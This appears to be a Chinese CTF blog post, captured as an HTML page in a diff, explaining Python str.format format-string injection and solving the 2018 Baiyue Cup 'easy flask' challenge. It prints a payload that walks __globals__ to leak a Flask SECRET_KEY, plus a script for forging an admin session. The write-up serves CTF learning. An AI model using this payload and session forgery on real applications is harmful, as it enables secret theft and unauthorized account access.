@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="python,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介就是使用方法不当导致格式化字符串的时候字符串受我们的控制   python常见格式化字符串的方式百分号形式123name = &apos;Xi4or0uji&apos;print &apos;My name is %s&apos; %nameMy name is Xi4or0uji 使用标准库中的模板字符串12345from string import Templatename = &apos;Xi4or0uji&apos;s = Template(&apos;">
+<meta name="keywords" content="python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python格式化字符串">
+<meta property="og:url" content="https://xi4or0uji.github.io/2019/02/21/2019-2-21-python格式化字符串/index.html">
+<meta property="og:site_name" content="蒟蒻的ctf博客">
+<meta property="og:description" content="简介就是使用方法不当导致格式化字符串的时候字符串受我们的控制   python常见格式化字符串的方式百分号形式123name = &apos;Xi4or0uji&apos;print &apos;My name is %s&apos; %nameMy name is Xi4or0uji 使用标准库中的模板字符串12345from string import Templatename = &apos;Xi4or0uji&apos;s = Template(&apos;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://xi4or0uji.github.io/images/format/1.png">
+<meta property="og:image" content="https://xi4or0uji.github.io/images/format/2.png">
+<meta property="og:image" content="https://xi4or0uji.github.io/images/format/3.png">
+<meta property="og:updated_time" content="2019-02-23T13:22:05.302Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="python格式化字符串">
+<meta name="twitter:description" content="简介就是使用方法不当导致格式化字符串的时候字符串受我们的控制   python常见格式化字符串的方式百分号形式123name = &apos;Xi4or0uji&apos;print &apos;My name is %s&apos; %nameMy name is Xi4or0uji 使用标准库中的模板字符串12345from string import Templatename = &apos;Xi4or0uji&apos;s = Template(&apos;">
+<meta name="twitter:image" content="https://xi4or0uji.github.io/images/format/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://xi4or0uji.github.io/2019/02/21/2019-2-21-python格式化字符串/">
+
+
+
+
+
+  <title>python格式化字符串 | 蒟蒻的ctf博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">蒟蒻的ctf博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://xi4or0uji.github.io/2019/02/21/2019-2-21-python格式化字符串/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Xi4or0uji">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="蒟蒻的ctf博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">python格式化字符串</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-21T17:33:52+08:00">
+                2019-02-21
+              </time>
+            
+
+            
+
+            
+          </span>
+		  
+
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/02/21/2019-2-21-python格式化字符串/" class="leancloud_visitors" data-flag-title="python格式化字符串">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>就是使用方法不当导致格式化字符串的时候字符串受我们的控制  </p>
+<h3 id="python常见格式化字符串的方式"><a href="#python常见格式化字符串的方式" class="headerlink" title="python常见格式化字符串的方式"></a>python常见格式化字符串的方式</h3><h4 id="百分号形式"><a href="#百分号形式" class="headerlink" title="百分号形式"></a>百分号形式</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">'Xi4or0uji'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'My name is %s'</span> %name</span><br><span class="line">My name <span class="keyword">is</span> Xi4or0uji</span><br></pre></td></tr></table></figure>
+<h4 id="使用标准库中的模板字符串"><a href="#使用标准库中的模板字符串" class="headerlink" title="使用标准库中的模板字符串"></a>使用标准库中的模板字符串</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> Template</span><br><span class="line">name = <span class="string">'Xi4or0uji'</span></span><br><span class="line">s = Template(<span class="string">'My name is $name'</span>)</span><br><span class="line"><span class="keyword">print</span> s.substitute(name=name)</span><br><span class="line">My name <span class="keyword">is</span> Xi4or0uji</span><br></pre></td></tr></table></figure>
+<h4 id="利用format格式化字符串"><a href="#利用format格式化字符串" class="headerlink" title="利用format格式化字符串"></a>利用format格式化字符串</h4><h5 id="直接格式化字符串"><a href="#直接格式化字符串" class="headerlink" title="直接格式化字符串"></a>直接格式化字符串</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">'My name is &#123;&#125;'</span>.format(<span class="string">'Xi4or0uji'</span>)</span><br><span class="line">My name <span class="keyword">is</span> Xi4or0uji</span><br></pre></td></tr></table></figure>
+<h5 id="指定位置"><a href="#指定位置" class="headerlink" title="指定位置"></a>指定位置</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">'this is a &#123;0&#125;, that is a &#123;1&#125;'</span>.format(<span class="string">'cat'</span>,<span class="string">'dog'</span>)</span><br><span class="line">this <span class="keyword">is</span> a cat, that <span class="keyword">is</span> a dog</span><br><span class="line"><span class="keyword">print</span> <span class="string">'this is a &#123;1&#125;, that is a &#123;0&#125;'</span>.format(<span class="string">'cat'</span>,<span class="string">'dog'</span>)</span><br><span class="line">this <span class="keyword">is</span> a dog, that <span class="keyword">is</span> a cat</span><br></pre></td></tr></table></figure>
+<h5 id="设置参数"><a href="#设置参数" class="headerlink" title="设置参数"></a>设置参数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">'hello &#123;adj&#125; &#123;name&#125;'</span>.format(adj=<span class="string">'little'</span>,name=<span class="string">'h4ck3r'</span>)</span><br><span class="line">hello little h4ck3r</span><br></pre></td></tr></table></figure>
+<h5 id="百分比格式"><a href="#百分比格式" class="headerlink" title="百分比格式"></a>百分比格式</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">'&#123;:.2%&#125; off'</span>.format(<span class="number">0.20</span>)</span><br><span class="line"><span class="number">20.00</span>% off</span><br></pre></td></tr></table></figure>
+<h5 id="获得数组的键值"><a href="#获得数组的键值" class="headerlink" title="获得数组的键值"></a>获得数组的键值</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">'&#123;arr[2]&#125;'</span>.format(arr=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>])</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>还有很多，不举例了  </p>
+<h3 id="一个小栗子"><a href="#一个小栗子" class="headerlink" title="一个小栗子"></a>一个小栗子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config = &#123;<span class="string">'SECRET_KEY'</span>:<span class="string">'lolololol'</span>&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">user = User(<span class="string">'Xi4or0uji'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'hello &#123;name&#125;'</span>.format(name=user.__class__.__init__.__globals__)</span><br></pre></td></tr></table></figure>
+<p>在这里的format如果可以受我们所控，就可以通过原来的对象获得他的所有的变量，从而将敏感信息打印出来<br><img src="/images/format/1.png" alt=""></p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h5 id="2018百越杯-easy-flask"><a href="#2018百越杯-easy-flask" class="headerlink" title="2018百越杯 easy flask"></a>2018百越杯 easy flask</h5><p>这题先去注册登录，然后可以看到有个session<br><img src="/images/format/2.png" alt=""><br>解密一下出来是一个id值<br><img src="/images/format/3.png" alt=""><br>登录页面发现有id这个参数，遍历一下可以看到id是5时，用户是admin<br>扫下泄露出来一个<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a> ，可以看到，想要拿到flag，必须是管理员<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@bp_auth.route('/flag')</span></span><br><span class="line"><span class="meta">@login_check</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">if</span>(g.user.username==<span class="string">"admin"</span>):</span><br><span class="line">		<span class="keyword">with</span> open(os.path.dirname(__file__)+<span class="string">'/flag'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">			flag = f.read()</span><br><span class="line">		<span class="keyword">return</span> flag</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"Not admin!!"</span></span><br></pre></td></tr></table></figure></p>
+<p>继续看下secret.py有个views_info函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@bp_secert.route('/views',methods = ['GET','POST'])</span></span><br><span class="line"><span class="meta">@login_check</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">views_info</span><span class="params">()</span>:</span></span><br><span class="line">	view_id = request.args.get(<span class="string">'id'</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> view_id:</span><br><span class="line">		view_id = session.get(<span class="string">'user_id'</span>)</span><br><span class="line"></span><br><span class="line">	user_m = user.query.filter_by(id=view_id).first()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> user_m <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">		flash(<span class="string">u"该用户未注册"</span>)</span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">'secert/views.html'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> str(session.get(<span class="string">'user_id'</span>))==str(view_id):</span><br><span class="line">		secert_m = secert.query.filter_by(id=view_id).first()</span><br><span class="line">		secert_t = <span class="string">u"&lt;p&gt;&#123;secert.secert&#125;&lt;p&gt;"</span>.format(secert = secert_m)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		secert_t = <span class="string">u"&lt;p&gt;***************************************&lt;p&gt;"</span></span><br><span class="line"></span><br><span class="line">	name = <span class="string">u"&lt;h1&gt;name:&#123;user_m.username&#125;&lt;h1&gt;"</span></span><br><span class="line">	email = <span class="string">u"&lt;h2&gt;email:&#123;user_m.email&#125;&lt;h2&gt;"</span></span><br><span class="line"></span><br><span class="line">	info = (name+email+secert_t).format(user_m=user_m)</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">'secert/views.html'</span>,info = info)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，这里有个format函数，里面有name、email和secret_t，继续往上看，还有一个format函数，解析secret_m，secret_m就是页面edit_secret的那个参数，至此，我们就可以利用format格式化字符串漏洞获得secret-key然后session伪造登录<br>payload如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;user_m.__class__.__mro__[<span class="number">1</span>].__class__.__mro__[<span class="number">0</span>].__init__.__globals__[SQLAlchemy].__init__.__globals__[current_app].config&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最后得到secret_key为ichunqiuQAQ013，接下来就是session的伪造<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'ichunqiuQAQ013'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_id</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'id'</span>] = <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"ok"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="keyword">True</span></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p>
+<p>然后修改session登录访问/flag就有flag  </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/python/" rel="tag"># python</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/19/2019-2-19-用docker搭个ctf题目/" rel="next" title="用docker搭个ctf题目">
+                <i class="fa fa-chevron-left"></i> 用docker搭个ctf题目
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/02/24/2019-2-24-2018百越杯wp/" rel="prev" title="2018百越杯wp">
+                2018百越杯wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Xi4or0uji">
+            
+              <p class="site-author-name" itemprop="name">Xi4or0uji</p>
+              <p class="site-description motion-element" itemprop="description">还在路上</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python常见格式化字符串的方式"><span class="nav-number">2.</span> <span class="nav-text">python常见格式化字符串的方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#百分号形式"><span class="nav-number">2.1.</span> <span class="nav-text">百分号形式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用标准库中的模板字符串"><span class="nav-number">2.2.</span> <span class="nav-text">使用标准库中的模板字符串</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用format格式化字符串"><span class="nav-number">2.3.</span> <span class="nav-text">利用format格式化字符串</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#直接格式化字符串"><span class="nav-number">2.3.1.</span> <span class="nav-text">直接格式化字符串</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#指定位置"><span class="nav-number">2.3.2.</span> <span class="nav-text">指定位置</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#设置参数"><span class="nav-number">2.3.3.</span> <span class="nav-text">设置参数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#百分比格式"><span class="nav-number">2.3.4.</span> <span class="nav-text">百分比格式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#获得数组的键值"><span class="nav-number">2.3.5.</span> <span class="nav-text">获得数组的键值</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一个小栗子"><span class="nav-number">3.</span> <span class="nav-text">一个小栗子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#例题"><span class="nav-number">4.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2018百越杯-easy-flask"><span class="nav-number">4.0.1.</span> <span class="nav-text">2018百越杯 easy flask</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xi4or0uji</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("kjsqHE2szT8D8zBgcoS3IuDJ-gzGzoHsz", "W2CzS27kkRW94qWAYaaWlnX7");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
